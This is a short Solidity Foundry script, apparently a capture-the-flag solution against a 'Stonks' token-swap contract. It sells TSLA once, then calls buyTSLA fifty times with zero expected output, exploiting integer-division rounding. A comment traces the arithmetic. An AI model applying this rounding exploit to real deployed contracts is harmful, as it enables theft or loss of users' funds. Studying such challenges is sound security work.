// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IStonks {
    function GME() external view returns (uint256);

    function ORACLE_TSLA_GME() external view returns (uint256);

    function TSLA() external view returns (uint256);

    function balanceOf(address _owner, uint256 _ticker)
        external
        view
        returns (uint256);

    function buyTSLA(uint256 amountGMEin, uint256 amountTSLAout) external;

    function sellTSLA(uint256 amountTSLAin, uint256 amountGMEout) external;
}
contract StonksScript is Script {
    IStonks stonks;
    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        stonks = IStonks(0x5B7118319919316d33bf220CC06D81eC6065654A);
    }
    function run() public {
        attack();
    }
    function attack() public {
        vm.startBroadcast(player);
        // vm.startPrank(player, player);
        stonks.sellTSLA(20, 1000);

        // console.log(stonks.balanceOf(msg.sender, 0));
        // console.log(stonks.balanceOf(msg.sender, 1));

        for(uint i = 0;i < 50; i++) {
            stonks.buyTSLA(40, 0);
        }
        console.log(stonks.balanceOf(msg.sender, 0));
        console.log(stonks.balanceOf(msg.sender, 1));
    }
}

/*
1 t = 50 g
x = y

T = 1 t * y / 50

G = T * 50 / 1 t

T = 20, G = 1000
T(20) -> G : G = 20 * 50 = 1000 : T = 0, G = 2000
G(40) -> T : T = 40 / 50 = 0 : T = 0, G = 1960
G(40) -> T : T = 40 / 50 = 0 : T = 0, G = 1920
G(40) -> T : T = 40 / 50 = 0 : T = 0, G = 1880

50th iter:
G(40) -> T : T = 40 / 50 = 0 : T = 0, G = 0
*/